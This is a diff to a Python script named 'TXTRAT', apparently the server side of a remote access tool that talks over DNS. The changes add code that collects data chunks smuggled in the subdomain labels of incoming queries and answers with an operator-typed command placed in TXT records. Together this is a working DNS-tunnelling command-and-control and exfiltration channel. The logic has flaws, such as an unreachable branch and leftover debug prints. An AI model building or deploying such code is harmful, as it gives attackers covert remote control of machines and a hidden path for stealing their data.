@@ -1,6 +1,7 @@
 import socket, glob, json
-import optparse
-import readline
+from optparse import OptionParser
+
+out = ''
 
 def load_zones():
 
@@ -75,11 +76,51 @@ def getquestiondomain(data):
 
     return (domainparts, questiontype)
 
+def pullchunksfirst(domain):
+    global out
+    print(out)
+
+    print(out)								# print
+    out = ''
+
+    c2id = 31337							# set this later when working with multiple connections
+    chunk = domain[0]
+    out += chunk
+
+    dictreturn = {'txt': [{'name': '@', 'ttl': 400, 'value': c2id}]}
+
+    return dictreturn
+
+def pullchunks(domain):
+    global out
+    print(out)
+
+    c2id = domain[0]
+    chunk = domain[1]
+    out += chunk
+
+    dictreturn = {'txt': [{'name': '@', 'ttl': 400, 'value': c2id}]}
+
+    return dictreturn
+
 def getzone(domain):
     global zonedata
 
-    zone_name = '.'.join(domain)
-    return zonedata[zone_name]
+    #zone_name = '.'.join(domain)
+
+    while 1:
+        zone_name = '.'.join(domain)
+        if zone_name in zonedata:
+            return zonedata[zone_name]
+        else:
+            if len(domain) > 5:
+                print("success")
+                return pullchunksfirst(domain)
+            elif len(domain) == 6:
+                return pullchunks(domain)
+            #domain.pop(0)
+            #print(domain)						# print
+
 
 def getrecs(data):
     domain, questiontype = getquestiondomain(data)
@@ -91,6 +132,16 @@ def getrecs(data):
         qt = 'txt'
 
     zone = getzone(domain)
+
+    """if len(domain) > 3:
+        zone = getzone(domain)
+    else:
+        zone = getzone("replacethisdomain.com")
+        domain = "replacethisdomain.com"
+"""
+
+    #print(zone)							# print
+    #print(domain)							# print
 
     return (zone[qt], qt, domain)
 
@@ -106,11 +157,11 @@ def buildquestion(domainname, rectype):
 
     if rectype == 'a':
         qbytes += (1).to_bytes(2, byteorder='big')
-        print(qbytes)
+        #print(qbytes)							# print
 
     if rectype == 'txt':
         qbytes += (16).to_bytes(2, byteorder='big')
-        print(qbytes)
+        #print(qbytes)							# print
 
     qbytes += (1).to_bytes(2, byteorder='big')
 
@@ -149,7 +200,7 @@ def rectobytes(domainname, rectype, recttl, recval):
 
     return rbytes
 
-def buildresponse(data):
+def buildresponse(data, command):
 
     # Transaction ID
     TransactionID = data[:2]
@@ -180,18 +231,21 @@ def buildresponse(data):
     dnsquestion = buildquestion(domainname, rectype)
 
     for record in records:
-        dnsbody += rectobytes(domainname, rectype, record["ttl"], record["value"])
+        if rectype == 'a':
+            dnsbody += rectobytes(domainname, rectype, record["ttl"], record["value"])
+        if rectype == 'txt':
+            if len(domainname) > 3:
+                dnsbody += rectobytes(domainname, rectype, record["ttl"], record["value"])	# if I need a unique value for future commands, continue to brance, if not, combine with prior if (if rectype == 'a' && len(domainname) > 3:)
+            else:
+                dnsbody += rectobytes(domainname, rectype, record["ttl"], command)
 
     return dnsheader + dnsquestion + dnsbody
 
 
 def main():
 
-    port = 53
-    ip = '127.0.0.1'
-
     usage = "TXTRAT"
-    parser = OptionParser(usage = usage)
+    parser = OptionParser()
 
     # IP address
     parser.add_option(
@@ -200,20 +254,24 @@ def main():
         help = "IPv4 address to set as listener",
         action = "store",
         type = "string",
-        dest = "address"
+        dest = "address",
+        default = '127.0.0.1'
     )
 
     (options, args) = parser.parse_args()
 
     ip = options.address
+    port = 53
 
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.bind((ip, port))
 
-    command = raw_input("input: ")
+    command = input("input: ")
 
     while 1:
         data, addr = sock.recvfrom(512)
-        r = buildresponse(data)
+        r = buildresponse(data, command)
         sock.sendto(r, addr)
+        #print(out)
 
+main()
